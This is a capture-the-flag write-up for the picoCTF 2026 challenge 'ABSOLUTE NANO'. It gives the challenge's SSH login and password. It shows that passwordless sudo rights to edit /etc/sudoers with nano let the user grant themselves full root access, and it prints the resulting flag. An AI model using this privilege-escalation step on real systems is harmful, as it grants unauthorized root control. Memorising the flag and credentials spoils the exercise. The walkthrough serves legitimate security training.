ABSOLUTE NANO

Name: ABSOLUTE NANO
Description: You have complete power with nano. Think you can get the flag? ssh -p 63127 ctf-player@crystal-peak.picoctf.net using password f8c75136
Author: Darkraicg492
Tags: Medium, General Skills, picoCTF 2026
Challenge from: picoCTF 2026
Hints:
1. What can you do with nano?

Theory

According to the description, to get the flag we have to do some black magic with nano, maybe some privilege escalation or something like that. So we'll skip on over to the solution part to enter into the SSH with the command and password that we are given.

Solution

So let's enter to the machine with the SSH command and check if there's anything there:

shukularuni@SHUKULAP:~$ ssh -p 55074 ctf-player@crystal-peak.picoctf.net
ctf-player@crystal-peak.picoctf.net's password: f8c75136

ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied

It seems that we can't open the flag file, let's check what we can do with sudo as a non-admin user:

ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers

So the only thing that we can do using sudo, the command that gives administrator powers, is edit the sudoers file with nano. This is actually perfect since with the sudoers file we can give ourselves more sudo permissions, so we'll open the file first with sudo:

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr...
...

Now just add this line wherever inside the file where we give ourselves permission to use sudo on anything:

ctf-player ALL=(ALL:ALL) NOPASSWD: ALL
#
# This file MUST be edited with the 'visudo' command as root.
#
...

To exit this just press Ctrl+O to save, enter, then Ctrl+X to exit the nano view. Now that we've done that we should be able to print the flag with sudo's permission:

ctf-player@challenge:~$ sudo cat flag.txt
picoCTF{n4n0_411_7h3_w4y_7b340dc3}

There we go! That's the flag.
